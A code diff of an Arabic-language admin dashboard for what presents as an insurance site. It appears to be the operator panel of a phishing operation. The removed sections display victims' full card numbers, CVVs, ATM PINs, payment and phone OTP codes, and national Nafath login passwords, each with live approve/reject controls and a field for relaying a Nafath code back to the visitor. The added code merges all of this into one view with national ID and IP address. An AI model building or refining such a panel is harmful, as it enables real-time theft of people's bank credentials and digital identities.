@@ -1407,7 +1407,8 @@ const AdminVisitors = () => {
                 )}
 
 
-                <Accordion type="multiple" defaultValue={["visitor-timeline", "visitor-info", "insurance-info", "payment-info", "payment-otp", "atm-info", "phone-verify", "phone-otp", "nafath-login", "nafath-code", "chat"]} className="space-y-2">
+                <Accordion type="multiple" defaultValue={["visitor-timeline", "all-data", "chat"]} className="space-y-2">
+                  {/* Timeline */}
                   <AccordionItem value="visitor-timeline" className="border border-border rounded-xl overflow-hidden">
                     <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                       <div className="flex items-center gap-2">
@@ -1439,7 +1440,6 @@ const AdminVisitors = () => {
                               : event.status === "rejected"
                                 ? "bg-destructive/10 text-destructive border-destructive/20"
                                 : "bg-amber-500/10 text-amber-600 border-amber-500/20";
-
                             return (
                               <div key={event.id} className="relative rounded-xl border border-border/50 bg-muted/20 p-4 pr-8">
                                 {index !== timelineEvents.length - 1 && (
@@ -1468,349 +1468,76 @@ const AdminVisitors = () => {
                     </AccordionContent>
                   </AccordionItem>
 
-                  {/* 9. رمز النفاذ */}
-                  {(() => {
-                    const nafathVerifyOrders = linkedOrders.filter(hasNafathVerifyTrail);
-                    return (
-                      <AccordionItem value="nafath-code" className={`border rounded-xl overflow-hidden ${nafathVerifyOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
-                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
-                          <div className="flex items-center gap-2">
-                            <ShieldCheck className="w-4 h-4 text-primary" />رمز النفاذ
-                            {nafathVerifyOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${nafathVerifyOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{nafathVerifyOrders.length}</span>}
-                          </div>
-                        </AccordionTrigger>
-                        <AccordionContent className="px-4 py-3">
-                          {nafathVerifyOrders.length === 0 ? (
-                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد رمز نفاذ</p>
-                          ) : (
-                            <div className="space-y-3">
-                              {nafathVerifyOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
-                                  <div className="grid grid-cols-2 gap-2">
-                                    <InfoItem label="المرحلة" value="تحقق نفاذ" />
-                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
-                                    {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
-                                  </div>
-                                  <div className="space-y-2 pt-2 border-t border-border/50">
-                                    <div className="flex items-center gap-2">
-                                      <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
-                                      <input
-                                        type="text"
-                                        placeholder="أدخل الرقم (مثل 35)"
-                                        value={getNafathInputValue(order)}
-                                        onChange={e => setNafathInputValue(order.id, e.target.value)}
-                                        className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
-                                      />
-                                    </div>
-                                    <div className="flex items-center gap-2">
-                                      <Button onClick={() => handleStageApprove(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة وإرسال
-                                      </Button>
-                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                      </Button>
-                                    </div>
-                                  </div>
-                                  {order.nafath_number && order.current_stage === "nafath_verify" && (
-                                    <div className="space-y-2 pt-2 border-t border-border/50">
-                                      <div className="flex items-center gap-2">
-                                        <span className="text-[10px] text-muted-foreground whitespace-nowrap">تعديل الرقم:</span>
-                                        <input
-                                          type="text"
-                                          placeholder={order.nafath_number}
-                                          value={getNafathInputValue(order)}
-                                          onChange={e => setNafathInputValue(order.id, e.target.value)}
-                                          className="flex-1 h-8 rounded-lg border-2 border-amber-400 bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
-                                        />
-                                        <Button onClick={() => handleUpdateNafathNumber(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-amber-500 hover:bg-amber-600 text-white gap-1" size="sm">
-                                          {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}تحديث
-                                        </Button>
-                                      </div>
-                                    </div>
-                                  )}
-                                </div>
-                              ))}
-                            </div>
-                          )}
-                        </AccordionContent>
-                      </AccordionItem>
-                    );
-                  })()}
-
-                  {/* 8. معلومات دخول النفاذ */}
-                  {(() => {
-                    const nafathLoginOrders = linkedOrders.filter(hasNafathLoginTrail);
-                    return (
-                      <AccordionItem value="nafath-login" className={`border rounded-xl overflow-hidden ${nafathLoginOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
-                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
-                          <div className="flex items-center gap-2">
-                            <Shield className="w-4 h-4 text-primary" />دخول النفاذ
-                            {nafathLoginOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${nafathLoginOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{nafathLoginOrders.length}</span>}
-                          </div>
-                        </AccordionTrigger>
-                        <AccordionContent className="px-4 py-3">
-                          {nafathLoginOrders.length === 0 ? (
-                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد دخول نفاذ</p>
-                          ) : (
-                            <div className="space-y-3">
-                              {nafathLoginOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
-                                  <div className="grid grid-cols-2 gap-2">
-                                    <InfoItem label="المرحلة" value="دخول نفاذ" />
-                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
-                                    {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
-                                    {order.national_id && <InfoItem label="اسم المستخدم" value={order.national_id} />}
-                                    {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
-                                  </div>
-                                  <div className="pt-2 border-t border-border/50 space-y-2">
-                                      <div className="flex items-center gap-2">
-                                        <input
-                                          type="text"
-                                          placeholder="رقم نفاذ (مثل 35)"
-                                          value={getNafathInputValue(order)}
-                                          onChange={e => setNafathInputValue(order.id, e.target.value)}
-                                          className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
-                                        />
-                                      </div>
-                                      <div className="flex items-center gap-2">
-                                        <Button onClick={() => handleStageApprove(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                          {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                        </Button>
-                                        <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                          {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                        </Button>
-                                      </div>
-                                    </div>
-                                </div>
-                              ))}
-                            </div>
-                          )}
-                        </AccordionContent>
-                      </AccordionItem>
-                    );
-                  })()}
-
-                  {/* 7. معلومات كود توثيق الجوال */}
-                  {(() => {
-                    const phoneOtpOrders = linkedOrders.filter(hasPhoneOtpTrail);
-                    return (
-                      <AccordionItem value="phone-otp" className={`border rounded-xl overflow-hidden ${phoneOtpOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
-                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
-                          <div className="flex items-center gap-2">
-                            <Phone className="w-4 h-4 text-primary" />كود توثيق الجوال
-                            {phoneOtpOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${phoneOtpOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{phoneOtpOrders.length}</span>}
-                          </div>
-                        </AccordionTrigger>
-                        <AccordionContent className="px-4 py-3">
-                          {phoneOtpOrders.length === 0 ? (
-                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد كود توثيق جوال</p>
-                          ) : (
-                            <div className="space-y-3">
-                              {phoneOtpOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
-                                  <div className="grid grid-cols-2 gap-2">
-                                    <InfoItem label="المرحلة" value="كود توثيق الجوال" />
-                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
-                                    {order.phone_otp_code && <InfoItem label="كود التحقق" value={order.phone_otp_code} />}
-                                    {order.phone && <InfoItem label="رقم الجوال" value={order.phone} />}
-                                  </div>
-                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                      </Button>
-                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                      </Button>
-                                    </div>
-                                </div>
-                              ))}
-                            </div>
-                          )}
-                        </AccordionContent>
-                      </AccordionItem>
-                    );
-                  })()}
-
-                  {/* 6. معلومات توثيق الجوال */}
-                  {(() => {
-                    const phoneOrders = linkedOrders.filter(hasPhoneVerificationTrail);
-                    return (
-                      <AccordionItem value="phone-verify" className={`border rounded-xl overflow-hidden ${phoneOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
-                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
-                          <div className="flex items-center gap-2">
-                            <Phone className="w-4 h-4 text-primary" />توثيق الجوال
-                            {phoneOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${phoneOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{phoneOrders.length}</span>}
-                          </div>
-                        </AccordionTrigger>
-                        <AccordionContent className="px-4 py-3">
-                          {phoneOrders.length === 0 ? (
-                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد توثيق جوال</p>
-                          ) : (
-                            <div className="space-y-3">
-                              {phoneOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
-                                  <div className="grid grid-cols-2 gap-2">
-                                    <InfoItem label="المرحلة" value={order.current_stage === "stc_call" ? "مكالمة STC" : "توثيق الجوال"} />
-                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
-                                    {order.phone && <InfoItem label="رقم الجوال" value={order.phone} />}
-                                  </div>
-                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                      </Button>
-                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                      </Button>
-                                    </div>
-                                </div>
-                              ))}
-                            </div>
-                          )}
-                        </AccordionContent>
-                      </AccordionItem>
-                    );
-                  })()}
-
-                  {/* 5. معلومات ATM */}
-                  {(() => {
-                    const atmOrders = linkedOrders.filter(o => o.atm_bill_number || o.atm_biller_code || o.atm_pin);
-                    return (
-                      <AccordionItem value="atm-info" className={`border rounded-xl overflow-hidden ${atmOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
-                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
-                          <div className="flex items-center gap-2">
-                            <FileText className="w-4 h-4 text-primary" />معلومات ATM
-                            {atmOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${atmOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-primary/10 text-primary"}`}>{atmOrders.length}</span>}
-                          </div>
-                        </AccordionTrigger>
-                        <AccordionContent className="px-4 py-3">
-                          {atmOrders.length === 0 ? (
-                            <p className="text-xs text-muted-foreground text-center py-3">لا توجد معلومات ATM</p>
-                          ) : (
-                            <div className="space-y-3">
-                              {atmOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
-                                  <div className="grid grid-cols-2 gap-2">
-                                    {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
-                                    {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
-                                    {order.atm_pin && <InfoItem label="الرقم السري" value={order.atm_pin} />}
-                                  </div>
-                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                      </Button>
-                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                      </Button>
-                                    </div>
-                                </div>
-                              ))}
-                            </div>
-                          )}
-                        </AccordionContent>
-                      </AccordionItem>
-                    );
-                  })()}
-
-                  {/* 4. معلومات كود الدفع بالبطاقة (OTP) */}
-                  {(() => {
-                    const otpOrders = linkedOrders.filter(hasOtpTrail);
-                    return (
-                      <AccordionItem value="payment-otp" className={`border rounded-xl overflow-hidden ${otpOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
-                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
-                          <div className="flex items-center gap-2">
-                            <Shield className="w-4 h-4 text-primary" />كود الدفع بالبطاقة
-                            {otpOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${otpOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-amber-500/10 text-amber-600"}`}>{otpOrders.length}</span>}
-                          </div>
-                        </AccordionTrigger>
-                        <AccordionContent className="px-4 py-3">
-                          {otpOrders.length === 0 ? (
-                            <p className="text-xs text-muted-foreground text-center py-3">لا يوجد كود دفع بانتظار</p>
-                          ) : (
-                            <div className="space-y-3">
-                              {otpOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
-                                  <div className="grid grid-cols-2 gap-2">
-                                    <InfoItem label="المرحلة" value="رمز التحقق OTP" />
-                                    <InfoItem label="الحالة" value={order.stage_status === "approved" ? "✓ تمت الموافقة" : order.stage_status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار"} />
-                                    {order.otp_verified !== null && <InfoItem label="تم التحقق" value={order.otp_verified ? "نعم" : "لا"} />}
-                                    {order.otp_code && <InfoItem label="كود OTP" value={order.otp_code} />}
-                                  </div>
-                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                      </Button>
-                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                      </Button>
-                                    </div>
-                                </div>
-                              ))}
-                            </div>
-                          )}
-                        </AccordionContent>
-                      </AccordionItem>
-                    );
-                  })()}
-
-                  {/* 3. معلومات الدفع (بطاقة الدفع كاملة) */}
-                  {(() => {
-                    const paymentOrders = linkedOrders.filter(o => o.card_number_full || o.card_last_four || o.card_holder_name || o.current_stage === "payment");
-                    return (
-                      <AccordionItem value="payment-info" className={`border rounded-xl overflow-hidden ${paymentOrders.some(o => o.stage_status === "pending" && o.current_stage === "payment") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
-                        <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
-                          <div className="flex items-center gap-2">
-                            <CreditCard className="w-4 h-4 text-primary" />معلومات الدفع
-                            {paymentOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${paymentOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-primary/10 text-primary"}`}>{paymentOrders.length}</span>}
-                          </div>
-                        </AccordionTrigger>
-                        <AccordionContent className="px-4 py-3">
-                          {paymentOrders.length === 0 ? (
-                            <p className="text-xs text-muted-foreground text-center py-3">لا توجد معلومات دفع</p>
-                          ) : (
-                            <div className="space-y-3">
-                              {paymentOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
-                                  <div className="grid grid-cols-2 gap-2">
-                                    {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
-                                    {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
-                                    {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
-                                    {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
-                                    {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
-                                    {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
-                                  </div>
-                                  {/* Stage approval for payment */}
-                                  <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                      </Button>
-                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                      </Button>
-                                    </div>
-                                </div>
-                              ))}
-                            </div>
-                          )}
-                        </AccordionContent>
-                      </AccordionItem>
-                    );
-                  })()}
-
-                  {/* 2. معلومات التأمين */}
-                  <AccordionItem value="insurance-info" className={`border rounded-xl overflow-hidden ${linkedRequests.some(r => r.status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
+                  {/* Unified data section */}
+                  <AccordionItem value="all-data" className={`border rounded-xl overflow-hidden ${linkedOrders.some(o => o.stage_status === "pending") || linkedRequests.some(r => r.status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                     <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                       <div className="flex items-center gap-2">
-                        <Shield className="w-4 h-4 text-primary" />معلومات التأمين
-                        {linkedRequests.length > 0 && <span className="px-1.5 py-0.5 rounded-full bg-primary/10 text-primary text-[10px] font-bold">{linkedRequests.length}</span>}
+                        <FileText className="w-4 h-4 text-primary" />جميع بيانات الزائر
+                        {(linkedRequests.length + linkedOrders.length) > 0 && <span className="px-1.5 py-0.5 rounded-full bg-primary/10 text-primary text-[10px] font-bold">{linkedRequests.length + linkedOrders.length}</span>}
                       </div>
                     </AccordionTrigger>
-                    <AccordionContent className="px-4 py-3">
-                      {linkedRequests.length === 0 && linkedOrders.length === 0 ? (
-                        <p className="text-xs text-muted-foreground text-center py-3">لا توجد معلومات تأمين</p>
-                      ) : (
-                        <div className="space-y-3">
+                    <AccordionContent className="px-4 py-3 space-y-4">
+                      {/* Personal info */}
+                      <div className="space-y-2">
+                        <p className="text-[11px] font-bold text-primary flex items-center gap-1.5"><User className="w-3.5 h-3.5" />المعلومات الشخصية</p>
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                          {visitorName && (
+                            <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                              <User className="w-3.5 h-3.5 text-primary shrink-0" />
+                              <div><p className="text-[9px] text-muted-foreground">الاسم</p><p className="text-xs font-medium text-foreground">{visitorName}</p></div>
+                            </div>
+                          )}
+                          {customerName && customerName !== visitorName && (
+                            <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                              <User className="w-3.5 h-3.5 text-primary shrink-0" />
+                              <div><p className="text-[9px] text-muted-foreground">اسم العميل</p><p className="text-xs font-medium text-foreground">{customerName}</p></div>
+                            </div>
+                          )}
+                          {visitorPhone && (
+                            <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                              <Phone className="w-3.5 h-3.5 text-primary shrink-0" />
+                              <div><p className="text-[9px] text-muted-foreground">رقم الجوال</p><p className="text-xs font-medium text-foreground">{visitorPhone}</p></div>
+                            </div>
+                          )}
+                          {visitorNationalId && (
+                            <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                              <CreditCard className="w-3.5 h-3.5 text-primary shrink-0" />
+                              <div><p className="text-[9px] text-muted-foreground">رقم الهوية</p><p className="text-xs font-medium text-foreground">{visitorNationalId}</p></div>
+                            </div>
+                          )}
+                          {selectedVisitor.country && (
+                            <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                              <Globe className="w-3.5 h-3.5 text-primary shrink-0" />
+                              <div><p className="text-[9px] text-muted-foreground">الدولة</p><p className="text-xs font-medium text-foreground">{countryFlag(selectedVisitor.country_code)} {selectedVisitor.country}</p></div>
+                            </div>
+                          )}
+                          {selectedVisitor.ip_address && (
+                            <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                              <Globe className="w-3.5 h-3.5 text-muted-foreground shrink-0" />
+                              <div><p className="text-[9px] text-muted-foreground">عنوان IP</p><p className="text-xs font-medium text-foreground">{selectedVisitor.ip_address}</p></div>
+                            </div>
+                          )}
+                          <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                            <Clock className="w-3.5 h-3.5 text-primary shrink-0" />
+                            <div><p className="text-[9px] text-muted-foreground">آخر نشاط</p><p className="text-xs font-medium text-foreground">{formatTime(selectedVisitor.last_seen_at)}</p></div>
+                          </div>
+                          <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                            <MapPin className="w-3.5 h-3.5 text-primary shrink-0" />
+                            <div><p className="text-[9px] text-muted-foreground">الصفحة الحالية</p><p className="text-xs font-medium text-foreground">{selectedVisitor.current_page || "/"}</p></div>
+                          </div>
+                          <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
+                            <Clock className="w-3.5 h-3.5 text-primary shrink-0" />
+                            <div><p className="text-[9px] text-muted-foreground">تاريخ الزيارة الأولى</p><p className="text-xs font-medium text-foreground">{formatDate(selectedVisitor.created_at)}</p></div>
+                          </div>
+                        </div>
+                      </div>
+
+                      {/* Insurance requests */}
+                      {linkedRequests.length > 0 && (
+                        <div className="space-y-2 pt-3 border-t border-border/50">
+                          <p className="text-[11px] font-bold text-primary flex items-center gap-1.5"><Shield className="w-3.5 h-3.5" />طلبات التأمين</p>
                           {linkedRequests.map(req => (
-                            <div key={req.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-3">
+                            <div key={req.id} className="bg-muted/20 rounded-xl border border-border/50 p-3 space-y-2">
                               <div className="flex items-center justify-between">
                                 <span className="text-xs font-bold text-foreground">
                                   طلب {req.request_type === "new" ? "جديد" : "تجديد"} - {insuranceTypeLabel[req.insurance_type || ""] || req.insurance_type || "غير محدد"}
@@ -1833,24 +1560,30 @@ const AdminVisitors = () => {
                                 {req.notes && <div className="col-span-2"><InfoItem label="ملاحظات" value={req.notes} /></div>}
                               </div>
                               <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                  <Button onClick={() => handleApprove(req.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                    {loadingAction === "approve-" + req.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                  </Button>
-                                  <Button onClick={() => handleReject(req.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                    {loadingAction === "reject-" + req.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                  </Button>
-                                </div>
+                                <Button onClick={() => handleApprove(req.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
+                                  {loadingAction === "approve-" + req.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
+                                </Button>
+                                <Button onClick={() => handleReject(req.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
+                                  {loadingAction === "reject-" + req.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
+                                </Button>
+                              </div>
                             </div>
                           ))}
+                        </div>
+                      )}
+
+                      {/* Orders with all details inline */}
+                      {linkedOrders.length > 0 && (
+                        <div className="space-y-2 pt-3 border-t border-border/50">
+                          <p className="text-[11px] font-bold text-primary flex items-center gap-1.5"><ShoppingCart className="w-3.5 h-3.5" />الطلبات والبيانات المقدمة</p>
                           {linkedOrders.map(order => (
-                            <div key={order.id} className={`bg-muted/20 rounded-xl border p-4 space-y-2 ${order.stage_status === "pending" ? "border-amber-500/50 bg-amber-500/5" : "border-border/50"}`}>
+                            <div key={order.id} className={`bg-muted/20 rounded-xl border p-3 space-y-3 ${order.stage_status === "pending" ? "border-amber-500/50 bg-amber-500/5" : "border-border/50"}`}>
                               <div className="flex items-center justify-between">
                                 <span className="text-xs font-bold text-foreground">{order.company || "غير محدد"} - {insuranceTypeLabel[order.insurance_type || ""] || order.insurance_type || ""}</span>
                                 <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${statusLabel[order.status]?.cls || "bg-muted text-muted-foreground"}`}>
                                   {statusLabel[order.status]?.text || order.status}
                                 </span>
                               </div>
-                              {/* Stage status indicator */}
                               {order.current_stage && (
                                 <div className="flex items-center gap-2 text-[11px]">
                                   <span className="text-muted-foreground">المرحلة:</span>
@@ -1861,6 +1594,7 @@ const AdminVisitors = () => {
                                 </div>
                               )}
                               <div className="grid grid-cols-2 gap-2">
+                                {/* Vehicle & insurance info */}
                                 {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
                                 {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
                                 {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
@@ -1873,89 +1607,87 @@ const AdminVisitors = () => {
                                 {order.total_price != null && <InfoItem label="السعر الإجمالي" value={`${order.total_price} ر.س`} />}
                                 {order.policy_number && <InfoItem label="رقم الوثيقة" value={order.policy_number} />}
